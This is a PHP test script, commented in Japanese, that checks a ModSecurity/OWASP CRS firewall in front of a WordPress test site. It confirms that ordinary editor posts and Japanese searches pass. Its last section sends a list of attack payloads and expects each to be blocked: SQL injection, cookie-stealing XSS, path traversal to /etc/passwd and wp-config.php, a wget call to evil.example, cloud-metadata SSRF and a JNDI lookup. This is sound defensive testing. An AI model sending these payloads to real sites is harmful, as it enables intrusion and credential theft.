<?php

/*
 * ModSecurity + OWASP CRS の誤検知と遮断を確かめる (docs/modsecurity.md の確認に使ったもの)
 *
 * 1. ModSecurity 入りの Apache で e2e テストを動かし、環境を残す
 *      docker build -t wpguard-modsec ...   (docs/modsecurity.md の「検証の再現」を参照)
 *      WPGUARD_E2E_KEEP=1 WPGUARD_E2E_IMAGE=wpguard-modsec php plugin/tests/e2e.php
 * 2. 編集者ユーザー eddie を作り、パーマリンクを「投稿名」にする (同じく docs を参照)
 * 3. php plugin/tests/modsecurity-check.php '<eddie のパスワード>'
 *
 * 環境変数 WAF_SITE で対象の URL を変えられます (既定: http://127.0.0.1:8080)。
 * 本番のサイトには実行しないでください (攻撃のリクエストを送ります)。
 */

$base = getenv('WAF_SITE') ?: 'http://127.0.0.1:8080'; $jar = tempnam(sys_get_temp_dir(), 'jar');
function req(string $method, string $path, $body = null, array $headers = []): array {
    global $base, $jar;
    $ch = curl_init($base . $path);
    curl_setopt_array($ch, [CURLOPT_CUSTOMREQUEST => $method, CURLOPT_RETURNTRANSFER => true, CURLOPT_COOKIEJAR => $jar, CURLOPT_COOKIEFILE => $jar,
        CURLOPT_HTTPHEADER => $headers, CURLOPT_PROXY => '', CURLOPT_NOPROXY => '*', CURLOPT_TIMEOUT => 30]);
    if ($body !== null) curl_setopt($ch, CURLOPT_POSTFIELDS, $body);
    $b = (string) curl_exec($ch); $GLOBALS['last'] = $b;
    return [(int) curl_getinfo($ch, CURLINFO_RESPONSE_CODE), $b];
}
$failed = 0;
function show(string $label, int $code, array $ok): void { global $failed; $good = in_array($code, $ok, true); $failed += $good ? 0 : 1; echo ($good ? '  ✓ ' : '  ✗ ') . "{$code}  {$label}\n"; }
$pass = $argv[1] ?? '';
if ($pass === '') { fwrite(STDERR, "使い方: php modsecurity-check.php '<編集者のパスワード>'\n"); exit(1); }
echo "\n編集者の普段の操作 (ユーザー eddie)\n";
req('GET', '/wp-login.php');
[$c] = req('POST', '/wp-login.php', http_build_query(['log' => 'eddie', 'pwd' => $pass, 'testcookie' => '1', 'wp-submit' => 'Log In']), ['Cookie: wordpress_test_cookie=WP%20Cookie%20check']);
show("記号を含むパスワードでログイン ({$pass})", $c, [302]);
[$c, $html] = req('GET', '/wp-admin/post-new.php');
show('投稿の新規作成画面', $c, [200]);
preg_match('/createNonceMiddleware\(\s*"([a-f0-9]+)"/', $html, $m); $nonce = $m[1] ?? '';
$json = ['Content-Type: application/json', 'X-WP-Nonce: ' . $nonce];
$posts = [
    'SQL の説明文' => '<!-- wp:paragraph --><p>SELECT * FROM wp_users WHERE id = 1; のように書くと、すべての列を取得できます。DROP TABLE は危険です。</p><!-- /wp:paragraph -->',
    'アクセス解析のタグを貼る' => '<!-- wp:html --><script>window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);}</script><!-- /wp:html -->',
    'YouTube の埋め込み' => '<!-- wp:html --><iframe width="560" height="315" src="https://www.youtube.com/embed/xyz" allowfullscreen></iframe><!-- /wp:html -->',
    'Linux のコマンド紹介' => '<!-- wp:code --><pre class="wp-block-code"><code>cd ../../ &amp;&amp; cat /etc/passwd | grep root</code></pre><!-- /wp:code -->',
    'JavaScript のコード例' => '<!-- wp:code --><pre><code>document.getElementById("x").onclick = function () { alert("hi"); };</code></pre><!-- /wp:code -->',
    '日本語の長文' => str_repeat('<p>これは日本語の本文です。「かぎかっこ」や、記号（！？＆％）を含みます。</p>', 200),
    '300KB の投稿 (ページビルダー想定)' => '<!-- wp:html --><div data-settings=\'' . str_repeat('{"widgetType":"text-editor","settings":{"editor":"<p>Lorem ipsum</p>"}},', 4000) . '\'></div><!-- /wp:html -->',
];
foreach ($posts as $label => $content) {
    [$c] = req('POST', '/wp-json/wp/v2/posts', json_encode(['title' => $label, 'content' => $content, 'status' => 'publish'], JSON_UNESCAPED_UNICODE), $json);
    show('投稿の保存: ' . $label . ' (' . round(strlen($content) / 1024) . 'KB)', $c, [201]);
}
$png = base64_decode('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==');
$tmpPdf = tempnam(sys_get_temp_dir(), 'pdf'); file_put_contents($tmpPdf, "%PDF-1.4\n1 0 obj<</Type/Catalog>>endobj\ntrailer<</Root 1 0 R>>\n%%EOF\n");
[$c] = req('POST', '/wp-json/wp/v2/media', ['file' => new CURLFile($tmpPdf, 'application/pdf', '資料_2026.pdf')], ['X-WP-Nonce: ' . $nonce]);
show('ファイルのアップロード (エディタと同じフォーム形式、日本語のファイル名)', $c, [201]);
[$c] = req('POST', '/wp-admin/admin-ajax.php', http_build_query(['action' => 'heartbeat', 'screen_id' => 'post', 'interval' => 60, '_nonce' => $nonce, 'data' => ['wp-refresh-post-lock' => ['post_id' => 1]]]));
show('管理画面の自動保存の通信 (heartbeat)', $c, [200]);
[$c] = req('GET', '/?s=' . rawurlencode("it's \"quoted\" & <b>"));
show('記号を含む検索', $c, [200]);
req('GET', '/wp-login.php?action=logout&_wpnonce=x');
@unlink($jar); $jar = tempnam(sys_get_temp_dir(), 'jar');
[$c] = req('POST', '/wp-comments-post.php', http_build_query(['comment' => "参考: https://example.com/page?a=1&b=2 を見てください。It's \"great\"!", 'author' => '山田', 'email' => 'yamada@example.com', 'comment_post_ID' => 1]));
show('コメントの投稿 (URL と引用符を含む)', $c, [302, 200, 409]);

echo "\n日本語の文章 (訪問者の検索)\n";
$corpus = [
    'コード例',
    'メール便で送ります',
    'サーバー設定例',
    'ユーザー例外の処理',
    'データの例を見せてください',
    'ワードプレスのテーマを変更したい',
    'お問い合わせフォームが送信できません',
    '「株式会社サンプル」の採用情報',
    '東京都渋谷区神南１－２－３　サンプルビル４階',
    '価格は￥１，９８０（税込）です',
    'ご予約は０３－１２３４－５６７８まで',
    '営業時間：平日１０：００～１８：００',
    '※ 土日祝日はお休みです。',
    '【重要】システムメンテナンスのお知らせ',
    'ＪａｖａＳｃｒｉｐｔ を有効にしてください',
    'SELECT 文の使い方を教えてください',
    '<b>太字</b>にする方法',
    'https://example.com/ja/ページ?id=1&lang=ja',
    'メールアドレス: info@example.co.jp',
    'パスワードを忘れた場合は、こちらから再設定してください。',
    'ログインできません。エラー: 「ユーザー名またはパスワードが正しくありません」',
    'カートに商品を追加しました。数量：２個',
    'ポイント５００円分プレゼント！',
    'キャンペーンコード：ＳＰＲＩＮＧ２０２６',
    'アップデートの手順（バージョン６.８→７.１）',
    'バックアップを取ってから、プラグインを更新しましょう。',
    'スマートフォン版の表示が崩れています。',
    '画面の右上の「ログアウト」ボタンを押してください。',
    'キーワード検索：「ＷｏｒｄＰｒｅｓｓ セキュリティ 対策」',
    '私の名前は田中です。よろしくお願いいたします。',
    '本日は晴天なり。気温は２８℃、湿度６０％。',
    '〒１５０－０００１　東京都渋谷区',
    'ファイル名：報告書_２０２６年１１月.pdf',
    'エクセルのマクロ（VBA）でデータを集計する方法',
    'プログラミング言語：PHP、JavaScript、Python',
    'シェルスクリプトで ls -la を実行する',
    '「../」を使った相対パスの書き方',
    'UNION と JOIN の違い',
    'イベント参加申込書（〆切：１２／１０）',
    'アンケートにご協力ください。所要時間：約５分',
    'レシピ：卵 2 個、砂糖 大さじ 1、牛乳 200ml',
    'ヴァイオリン教室のご案内',
    'ゲーム実況チャンネル',
    'ダウンロード',
    'ジャーナル',
    'オーバーレイ',
];
foreach ($corpus as $w) {
    [$c] = req('GET', '/?s=' . rawurlencode($w));
    if ($c === 403) { show("検索「{$w}」", $c, [200]); }
}
echo '  ' . count($corpus) . " 件を試しました (遮断されたものだけ表示)\n";

echo "\n攻撃 (403 で遮断されること)\n";
$attacks = [
    '/?id=1\' UNION SELECT user_login,user_pass FROM wp_users--',
    '/?id=1 AND SLEEP(5)',
    '/?p=1\' OR \'1\'=\'1',
    '/?s=<script>alert(document.cookie)</script>',
    '/?s="><img src=x onerror=alert(1)>',
    '/?s=<svg/onload=alert(1)>',
    '/?file=../../../../etc/passwd',
    '/?page=....//....//wp-config.php',
    '/?cmd=;cat /etc/passwd',
    '/?x=$(wget http://evil.example/sh)',
    '/?url=http://169.254.169.254/latest/meta-data/',
    '/?inc=php://filter/convert.base64-encode/resource=wp-config.php',
    '/wp-content/plugins/x/readme.txt?<?php system(\'id\'); ?>',
    '/?s=日本語<script>alert(1)</script>',
    '/?q={{7*7}}${jndi:ldap://evil.example/a}',
];
foreach ($attacks as $a) {
    $parts = explode('?', $a, 2);
    $url = $parts[0] . (isset($parts[1]) ? '?' . implode('&', array_map(static function ($kv) { [$k, $v] = array_pad(explode('=', $kv, 2), 2, ''); return rawurlencode($k) . '=' . rawurlencode($v); }, explode('&', $parts[1]))) : '');
    [$c] = req('GET', $url);
    show($a, $c, [403]);
}
echo $failed === 0 ? "\nすべて期待どおりです\n" : "\n{$failed} 件が期待と違います\n";
exit($failed === 0 ? 0 : 1);
